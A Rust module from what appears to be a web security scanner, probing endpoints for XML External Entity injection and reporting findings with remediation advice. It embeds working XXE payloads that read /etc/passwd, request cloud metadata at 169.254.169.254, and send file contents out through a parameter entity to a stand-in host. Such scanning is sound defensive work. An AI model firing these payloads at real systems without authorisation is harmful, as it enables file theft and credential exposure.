//! XXE (XML External Entity) Injection Module
//!
//! Probes endpoints that accept or might accept XML payloads for XXE vulnerabilities.
//!
//! Attack vectors tested:
//!  - Classic file-read:  `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
//!  - Blind SSRF via OOB: `<!ENTITY xxe SYSTEM "http://169.254.169.254/">`
//!  - Parameter entities (for validating parsers)
//!  - Content-Type switching: tries XML against endpoints that normally expect JSON

use std::time::Duration;

use reqwest::Client;
use uuid::Uuid;

use crate::models::{Finding, FindingSource, OwaspCategory, Severity};

// ── Classic XXE payloads ──────────────────────────────────────────────────────

/// Canary strings we expect to see in the response if the file was read
static PASSWD_CANARIES: &[&str] = &["root:x:0:0", "/bin/bash", "/bin/sh", "nologin"];

/// (label, payload, expected_canary, severity)
static XXE_PAYLOADS: &[(&str, &str, &str, Severity)] = &[
    (
        "File Read — /etc/passwd",
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>"#,
        "root:x:0:0",
        Severity::Critical,
    ),
    (
        "File Read — /etc/hostname",
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><data>&xxe;</data></root>"#,
        "localhost",          // broad match — any text response means it worked
        Severity::High,
    ),
    (
        "SSRF via XXE — Cloud Metadata",
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>"#,
        "ami-id",
        Severity::Critical,
    ),
    (
        "XXE Parameter Entity",
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://example.invalid/?d=%file;'>">
  %eval;
  %exfil;
]>
<root/>
"#,
        "root:x:0:0",
        Severity::Critical,
    ),
];

// ── OOB / Blind triggers (no in-band canary available) ────────────────────────

/// Payloads that trigger a DNS/HTTP callback — detected via server error (not canary match)
static OOB_PAYLOADS: &[(&str, &str)] = &[
    (
        "Blind XXE — DTD External Subset",
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://169.254.169.254/xxe-probe">
<root/>
"#,
    ),
];

// ── Error signatures that indicate the XML parser is active ──────────────────

static XXE_ERROR_SIGNS: &[&str] = &[
    "xml", "XML", "entity", "ENTITY", "DOCTYPE", "SAXParser",
    "XMLReader", "DOMException", "ExpatError", "lxml",
    "ParseError", "parse error", "Premature end of file",
    "No entity", "Undefined entity", "entity not found",
];

// ── Content-types to try ──────────────────────────────────────────────────────

static XML_CONTENT_TYPES: &[&str] = &[
    "application/xml",
    "text/xml",
    "application/xhtml+xml",
];

// ── Public entry point ────────────────────────────────────────────────────────

pub async fn check(client: &Client, url: &str, tout: Duration) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Skip non-API endpoints that are definitely not going to parse XML
    if is_static_asset(url) {
        return findings;
    }

    for &ct in XML_CONTENT_TYPES {
        // ── In-band (classic) XXE ─────────────────────────────────────────────
        for (label, payload, canary, severity) in XXE_PAYLOADS {
            if let Some(f) = try_in_band(client, url, ct, label, payload, canary, severity.clone(), tout).await {
                findings.push(f);
                return findings; // one confirmed XXE per endpoint is enough
            }
        }

        // ── Blind OOB XXE — look for server errors indicating parsing attempt ─
        for (label, payload) in OOB_PAYLOADS {
            if let Some(f) = try_oob(client, url, ct, label, payload, tout).await {
                findings.push(f);
            }
        }
    }

    findings
}

// ── In-band probe: look for file content in the response ─────────────────────

async fn try_in_band(
    client: &Client,
    url: &str,
    content_type: &str,
    label: &str,
    payload: &str,
    canary: &str,
    severity: Severity,
    tout: Duration,
) -> Option<Finding> {
    let resp = client
        .post(url)
        .header("Content-Type", content_type)
        .body(payload.to_string())
        .timeout(tout)
        .send()
        .await
        .ok()?;

    let status = resp.status().as_u16();
    // Skip totally unresponsive or method-not-allowed
    if status == 405 || status == 415 || status == 404 || status == 301 || status == 302 {
        return None;
    }

    let body = resp.text().await.ok()?;

    // Check for our canary *or* any passwd-like line
    let triggered = body.contains(canary)
        || PASSWD_CANARIES.iter().any(|c| body.contains(c));

    if triggered {
        Some(Finding {
            id: Uuid::new_v4().to_string(),
            category: OwaspCategory::BrokenAccessControl,
            severity,
            title: format!("[XXE] XML External Entity Injection — {}", label),
            description: format!(
                "The endpoint `{}` is vulnerable to XML External Entity (XXE) injection. \
                 The server parsed a crafted XML document containing an external entity \
                 reference and included the resolved content in its response. \
                 Payload type: **{}**.",
                url, label
            ),
            evidence: Some(format!(
                "Content-Type: {}\nPayload:\n{}\n\nStatus: {}\nBody snippet:\n{}",
                content_type, payload, status,
                &body[..400.min(body.len())]
            )),
            remediation: "Disable external entity processing in your XML parser. \
                          In Java: set `XMLConstants.FEATURE_SECURE_PROCESSING`. \
                          In Python (lxml): use `resolve_entities=False`. \
                          Never parse untrusted XML with a default-configured parser.".to_string(),
            source: FindingSource::XxeScanner,
            endpoint: Some(url.to_string()),
        })
    } else {
        None
    }
}

// ── OOB/Blind probe: detect XML parser activity via error signatures ──────────

async fn try_oob(
    client: &Client,
    url: &str,
    content_type: &str,
    label: &str,
    payload: &str,
    tout: Duration,
) -> Option<Finding> {
    let resp = client
        .post(url)
        .header("Content-Type", content_type)
        .body(payload.to_string())
        .timeout(tout)
        .send()
        .await
        .ok()?;

    let status = resp.status().as_u16();
    if status == 405 || status == 415 || status == 404 {
        return None;
    }

    let body = resp.text().await.ok()?;

    // If the response body contains XML-parser error strings the server IS parsing XML
    let xml_parser_active = XXE_ERROR_SIGNS.iter().any(|sign| body.contains(sign));

    if xml_parser_active && status >= 400 {
        Some(Finding {
            id: Uuid::new_v4().to_string(),
            category: OwaspCategory::InsecureDesign,
            severity: Severity::Medium,
            title: format!("[XXE] Blind XML Parser Active — {}", label),
            description: format!(
                "The endpoint `{}` appears to parse XML input (Content-Type: {}) and returned \
                 an XML-parser error. While no file content was reflected in-band, \
                 the active XML parser may be exploitable via out-of-band data exfiltration \
                 or SSRF techniques.",
                url, content_type
            ),
            evidence: Some(format!(
                "Content-Type: {}\nPayload:\n{}\n\nStatus: {}\nBody snippet:\n{}",
                content_type, payload, status,
                &body[..400.min(body.len())]
            )),
            remediation: "Disable external entity resolution and DTD processing in your XML parser. \
                          Use a safe-by-default parser configuration.".to_string(),
            source: FindingSource::XxeScanner,
            endpoint: Some(url.to_string()),
        })
    } else {
        None
    }
}

// ── Helper ────────────────────────────────────────────────────────────────────

fn is_static_asset(url: &str) -> bool {
    let path = url.split('?').next().unwrap_or(url).to_lowercase();
    matches!(
        path.rsplit('.').next().unwrap_or(""),
        "js" | "css" | "png" | "jpg" | "jpeg" | "gif" | "ico"
            | "svg" | "woff" | "woff2" | "ttf" | "map" | "webp"
    )
}
